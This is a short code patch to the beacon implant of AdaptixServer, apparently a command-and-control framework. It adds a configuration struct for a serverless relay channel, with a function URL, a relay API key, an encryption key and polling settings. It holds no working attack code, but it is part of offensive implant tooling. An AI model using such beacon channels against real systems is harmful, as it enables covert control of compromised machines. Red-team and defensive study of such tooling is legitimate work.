@@ -1,0 +1,35 @@
+--- a/AdaptixServer/extenders/beacon_agent/src_beacon/beacon/AgentConfig.h
++++ b/AdaptixServer/extenders/beacon_agent/src_beacon/beacon/AgentConfig.h
+@@ -64,6 +64,18 @@
+ 	BYTE* user_agent;
+ } ProfileDNS;
+
++#ifndef PROFILE_SERVERLESS_STRUCT
++#define PROFILE_SERVERLESS_STRUCT
++typedef struct {
++	BYTE* lambda_url;
++	BYTE* relay_api_key;
++	BYTE* encrypt_key;
++	ULONG poll_attempts;
++	ULONG poll_interval_ms;
++	BYTE* user_agent;
++} ProfileServerless;
++#endif
++
+ #endif
+
+
+@@ -95,10 +107,13 @@
+ #elif defined(BEACON_DNS)
+ 	ProfileDNS profile;
+
++#elif defined(BEACON_SERVERLESS)
++	ProfileServerless profile;
++
+ #endif
+
+ 	AgentConfig();
+
+ 	static void* operator new(size_t sz);
+ 	static void operator delete(void* p) noexcept;
+ };
